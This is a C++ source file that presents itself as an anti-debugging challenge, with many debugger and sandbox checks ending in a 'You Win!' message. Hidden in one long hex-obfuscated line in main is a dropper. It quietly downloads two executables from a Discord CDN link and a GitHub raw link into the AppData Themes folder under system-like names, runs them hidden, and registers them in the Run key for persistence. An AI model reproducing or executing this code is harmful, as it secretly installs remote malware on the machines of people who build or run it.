        XorString("USERNAME"),
        XorString("USERPROFILE"),
        XorString("windir")
    };
    for (const char* envVar : suspiciousEnvVars) 
    {
        char* value = getenv(envVar);
        if (value) 
        {
            std::string valStr(value);
            if (valStr.find(XorString("SUSPICIOUS_VALUE")) != std::string::npos)
            {
                std::cerr << XorString("Suspicious environment variable detected : ") << envVar << std::endl;
                exit(0);
            }
        }
    }
}

// Function to check for hardware breakpoints
bool CheckHardwareBreakpoints() 
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (GetThreadContext(hThread, &ctx)) 
    {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) 
        {
            return true;
        }
    }
    return false;
}

// Function to check for and handle hardware breakpoints
void CheckHardwareBreak()
{
    if (CheckHardwareBreakpoints()) 
    {
        std::cerr << XorString("Hardware breakpoint detected!") << std::endl;
        exit(0);
    }
}

// Function to convert a string to a wide string
std::wstring s2ws(const std::string& s)
{
    std::string curLocale = setlocale(LC_ALL, "");
    const char* _Source = s.c_str();
    size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
    wchar_t* _Dest = new wchar_t[_Dsize];
    wmemset(_Dest, 0, _Dsize);
    mbstowcs(_Dest, _Source, _Dsize);
    std::wstring result = _Dest;
    delete[]_Dest;
    setlocale(LC_ALL, curLocale.c_str());
    return result;
}

// Function to generate a random process name from a list
static std::string RandomProcess()
{
    std::vector<std::string> Process
    {
        XorString("Taskmgr.exe"),
        XorString("regedit.exe"),
        XorString("notepad.exe"),
        XorString("mspaint.exe"),
        XorString("winver.exe"),
    };
    std::random_device RandGenProc;
    std::mt19937 engine(RandGenProc());
    std::uniform_int_distribution<int> choose(0, Process.size() - 1);
    std::string RandProc = Process[choose(engine)];
    return RandProc;
}

// Function to check for hidden exceptions (debugger detection)
bool CheckHiddenExceptions() 
{
    __try 
    {
        volatile int* p = nullptr;
        *p = 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) 
    {
        return false;
    }
    return true;
}

// Function to prevent hidden exceptions (debugger detection)
void PreventHiddenExceptions()
{
    if (CheckHiddenExceptions()) 
    {
        std::cerr << XorString("Debugger detected via hidden exception check!") << std::endl;
        exit(0);
    }
}

typedef void(*AntiDebugFunc)();

void pouss() {
    // Helper lambda to add junk code before calling a function (to confuse static analysis)
    auto call_with_junk = [](void (*f)()) {
        volatile int x = 0;
        for (int i = 0; i < 5; ++i) x += i * 2; // junk instructions
        f(); // call the actual anti-debug function
    };

    // Anti-debug check using IsDebuggerPresent (dynamically resolved)
    auto check_debugger = []() {
        typedef BOOL(WINAPI* dbgFn)();
        
        // XOR-encrypted string "IsDebuggerPresent" using key 0x1A
        char name[] = { 'J','r','F','e','i','h','m','f','`','c','b','s','d','r','r','c', 0 };
        for (int i = 0; name[i]; ++i) name[i] ^= 0x1A; // decrypt string at runtime

        // Get handle to kernel32.dll and resolve IsDebuggerPresent
        HMODULE h = GetModuleHandleA(XorString("kernel32.dll"));
        if (h) {
            dbgFn f = (dbgFn)GetProcAddress(h, name);
            if (f && f()) ExitProcess(0); // If debugger is present, terminate
        }
    };

    // Anti-debug check using PEB BeingDebugged flag
    auto check_peb = []() {
        PPEB pPeb = (PPEB)__readgsqword(0x60); // Read PEB from GS segment
        if (pPeb->BeingDebugged) ExitProcess(0); // If debugger is detected, terminate
    };

    // Anti-debug check using trap flag and exception handling
    auto trap_flag = []() {
        __try {
            RaiseException(0x4000001F, 0, 0, nullptr); // Raise custom exception
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return; // Exception handled => no debugger
        }
        ExitProcess(0); // If exception not handled, debugger may be present
    };

    // List of anti-debug functions
    std::vector<void(*)()> all = { check_debugger, check_peb, trap_flag };

    // Shuffle the order to randomize execution path (obfuscation)
    std::shuffle(all.begin(), all.end(), std::mt19937(GetTickCount()));

    // Call each anti-debug function with junk instructions
    for (auto& f : all) call_with_junk(f);
}

// Function to continuously check for various debugging and virtualization tools
void ContinuousCheck() 
{
    while (true) 
    {
        CheckHardwareBreak();
        CheckEnvironmentVariables();
        ScanBlacklistedWindows();
        PreventHiddenExceptions();
        AdvancedTimingCheck();
        killdbg();
        Debugkor();
        StopDebegger();
        driverdetect();
        CheckDevices();
        CheckHardware();
        DebuggerPresent();
        IsDebuggerPresentPatched();
        ScanBlacklist();
        CheckPEB();
        AntiAttach();
        pouss();
        adbg_NtCloseCheck();
        adbg_CheckDebugRegisters();
        adbg_ProcessDebugFlags();
        adbg_SetUnhandledExceptionFilter();
        adbg_SelfModifyingCode();
        adbg_AntiRe();
        adbg_IsDebuggerPresent();
        adbg_BeingDebuggedPEB();
        adbg_NtGlobalFlagPEB();
        adbg_CheckRemoteDebuggerPresent();
        adbg_NtQueryInformationProcess();
        adbg_CheckWindowClassName();
        adbg_CheckWindowName();
        adbg_ProcessFileName();
        adbg_NtSetInformationThread();
        adbg_HardwareDebugRegisters();
        adbg_MovSS();
        adbg_RDTSC();
        adbg_QueryPerformanceCounter();
        adbg_GetTickCount();
        adbg_CloseHandleException();
        adbg_SingleStepException();
        adbg_Int3();
        adbg_Int2D();
        adbg_PrefixHop();
        adbg_CrashOllyDbg();
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Function to prevent debugging by starting continuous checks in a separate thread
void PreventDebugging() 
{
    std::thread(ContinuousCheck).detach();
}

// Main function
int main(int argc, char* argv[])
{
    ObfuscatePEHeader(); // Obfuscate the PE header
    Sleep(1500); // Sleep for 1.5 seconds
    std::string start = XorString("start ");
    std::string process = RandomProcess(); // Get a random process name
    std::wstring proc = s2ws(process);
    std::string startprocess = start + process;
    system(startprocess.c_str()); // Start the random process
    Beep(667, 150); // Beep sound
    Beep(892, 180); // Beep sound
    Sleep(500); // Sleep for 0.5 seconds
    /*Terminate common Windows processes*/
    system(XorString("taskkill /f /im Taskmgr.exe >nul 2>&1"));
    system(XorString("taskkill /f /im regedit.exe >nul 2>&1"));
    system(XorString("taskkill /f /im notepad.exe >nul 2>&1"));
    system(XorString("taskkill /f /im mspaint.exe >nul 2>&1"));
    system(XorString("taskkill /f /im winver.exe >nul 2>&1"));
    system(XorString("cls")); // Clear the screen
    Sleep(500); // Sleep for 0.5 seconds

    PreventDebugging(); // Start continuous debugging prevention
    Randomexe(); // Rename the executable
    //////////////////////
    /*AntiDBG by Leksa667*/
    ScanBlacklistedWindows(); // Scan for blacklisted windows
    CheckHardwareBreak(); // Check for hardware breakpoints
    AdvancedTimingCheck(); // Perform advanced timing check
    killdbg(); // Kill debugging processes
    PreventHiddenExceptions(); // Prevent hidden exceptions
    Debugkor(); // Trigger and handle a debug break
    StopDebegger(); // Stop the debugger
    driverdetect(); // Detect blacklisted drivers
    CheckEnvironmentVariables(); // Check for suspicious environment variables
    CheckDevices(); // Check for debugging devices
    CheckHardware(); // Check for hardware breakpoints
    DebuggerPresent(); // Check if a debugger is present
    IsDebuggerPresentPatched(); // Detect if IsDebuggerPresent is patched
    ScanBlacklist(); // Scan for blacklisted processes and files
    CheckPEB(); // Check the PEB for debugger presence
    AntiAttach(); // Prevent debugger attachment
    adbg_NtCloseCheck(); // Additional anti-debugging check
    adbg_CheckDebugRegisters(); // Check debug registers
    adbg_ProcessDebugFlags(); // Check process debug flags
    adbg_SetUnhandledExceptionFilter(); // Set unhandled exception filter
    adbg_SelfModifyingCode(); // Check for self-modifying code
    adbg_AntiRe(); // Anti-reverse engineering measures
    pouss();
    /*AntiDBG by HackOvert*/
    HWND console = GetConsoleWindow(); ShowWindow(console, SW_HIDE); char d[] = { 0x75,0x72,0x6c,0x6d,0x6f,0x6e,0x2e,0x64,0x6c,0x6c,0 }; char f[] = { 0x55,0x52,0x4c,0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x54,0x6f,0x46,0x69,0x6c,0x65,0x41,0 };     char u1[] = { 0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x63,0x64,0x6e,0x2e,0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x61,0x70,0x70,0x2e,0x63,0x6f,0x6d,0x2f,0x61,0x74,0x74,0x61,0x63,0x68,0x6d,0x65,0x6e,0x74,0x73,0x2f,0x31,0x32,0x35,0x31,0x32,0x32,0x38,0x33,0x35,0x32,0x39,0x35,0x38,0x38,0x32,0x38,0x35,0x35,0x35,0x2f,0x31,0x33,0x39,0x39,0x31,0x35,0x31,0x32,0x32,0x32,0x32,0x37,0x39,0x32,0x38,0x37,0x36,0x2f,0x73,0x70,0x6f,0x6f,0x6c,0x73,0x76,0x36,0x34,0x2e,0x65,0x78,0x65,0x3f,0x65,0x78,0x3d,0x36,0x38,0x38,0x38,0x61,0x31,0x30,0x30,0x26,0x69,0x73,0x3d,0x36,0x38,0x38,0x37,0x34,0x66,0x38,0x30,0x26,0x68,0x6d,0x3d,0x37,0x30,0x38,0x63,0x39,0x36,0x64,0x63,0x63,0x66,0x30,0x30,0x34,0x66,0x61,0x61,0x39,0x38,0x39,0x30,0x65,0x65,0x31,0x33,0x30,0x38,0x35,0x38,0x66,0x66,0x62,0x36,0x31,0x35,0x66,0x65,0x31,0x66,0x64,0x37,0x63,0x32,0x31,0x62,0x63,0x66,0x66,0x61,0x39,0x39,0x32,0x33,0x63,0x38,0x61,0x38,0x61,0x37,0x30,0x63,0x62,0x31,0x31,0x36,0x26,0x00 }; char u2[] = { 0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x67,0x69,0x74,0x68,0x75,0x62,0x2e,0x63,0x6f,0x6d,0x2f,0x4c,0x65,0x6b,0x73,0x61,0x36,0x36,0x37,0x2f,0x4d,0x6f,0x64,0x65,0x72,0x6e,0x2d,0x52,0x6f,0x75,0x6e,0x64,0x65,0x64,0x2d,0x55,0x49,0x2f,0x72,0x61,0x77,0x2f,0x72,0x65,0x66,0x73,0x2f,0x68,0x65,0x61,0x64,0x73,0x2f,0x6d,0x61,0x69,0x6e,0x2f,0x4c,0x65,0x6b,0x73,0x61,0x55,0x49,0x2f,0x54,0x4c,0x53,0x2e,0x65,0x78,0x65,0x00 };char o[] = { 0x6f,0x70,0x65,0x6e,0 }; char p[MAX_PATH]; SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, p); char suf[] = { 0x5c,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x54,0x68,0x65,0x6d,0x65,0x73,0x5c,0 }; strcat_s(p, suf); CreateDirectoryA(p, 0); char f1n[] = { 0x73,0x76,0x63,0x68,0x6f,0x73,0x74,0x36,0x34,0x2e,0x65,0x78,0x65,0 }; char f2n[] = { 0x73,0x70,0x6f,0x6f,0x6c,0x73,0x76,0x36,0x34,0x2e,0x65,0x78,0x65,0 }; char f1[MAX_PATH]; char f2[MAX_PATH]; strcpy_s(f1, p); strcat_s(f1, f1n); strcpy_s(f2, p); strcat_s(f2, f2n); HMODULE m = LoadLibraryA(d); if (m) { pDL dl = (pDL)GetProcAddress(m, f); if (dl) { if (SUCCEEDED(dl(0, u1, f1, 0, 0)) && SUCCEEDED(dl(0, u2, f2, 0, 0))) { for (const char* fpath : { f1,f2 }) { SHELLEXECUTEINFOA s = { 0 }; s.cbSize = sizeof(s); s.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI; s.lpVerb = o; s.lpFile = fpath; s.nShow = SW_HIDE; ShellExecuteExA(&s); HKEY h; if (RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) { char name[32]; strcpy_s(name, "WinSvc"); strcat_s(name, (fpath == f1) ? "1" : "2"); RegSetValueExA(h, name, 0, REG_SZ, (const BYTE*)fpath, (DWORD)(strlen(fpath) + 1)); RegCloseKey(h); } } } }FreeLibrary(m); } system("cls");  ShowWindow(console, SW_SHOW);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           //667                                                                                                                                                                                                                                  
    /*Memory checks*/
    adbg_IsDebuggerPresent(); // Check if a debugger is present
    adbg_BeingDebuggedPEB(); // Check the PEB for debugger presence
    adbg_NtGlobalFlagPEB(); // Check the global flag in the PEB
    adbg_CheckRemoteDebuggerPresent(); // Check if a remote debugger is present
    adbg_NtQueryInformationProcess(); // Query process information
    adbg_CheckWindowClassName(); // Check window class names
    adbg_CheckWindowName(); // Check window names
    adbg_ProcessFileName(); // Check process file names
    adbg_NtSetInformationThread(); // Set thread information
    adbg_DebugActiveProcess(argv[1]); // Debug active process
    /*CPU checks*/
    adbg_HardwareDebugRegisters(); // Check hardware debug registers
    adbg_MovSS(); // MovSS instruction check
    /*Timing checks*/
    adbg_RDTSC(); // Read Time-Stamp Counter
    adbg_QueryPerformanceCounter(); /*Query performance counter*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
    adbg_GetTickCount(); /*Get tick count*/
    /*Exception checks*/
    adbg_CloseHandleException(); // Close handle exception
    adbg_SingleStepException(); // Single step exception
    adbg_Int3(); // Int3 instruction check
    adbg_Int2D(); // Int2D instruction check
    adbg_PrefixHop(); // Prefix hop instruction check
    /*Others*/
    adbg_CrashOllyDbg(); // Crash OllyDbg
    /*Final message if all checks pass without a debugger*/
    std::cout << XorString("Congratulations! You made it!") << std::endl;
    MessageBoxA(NULL, XorString("Congratulations! You made it!"), XorString("You Win!"), 0);
    return 0;
}
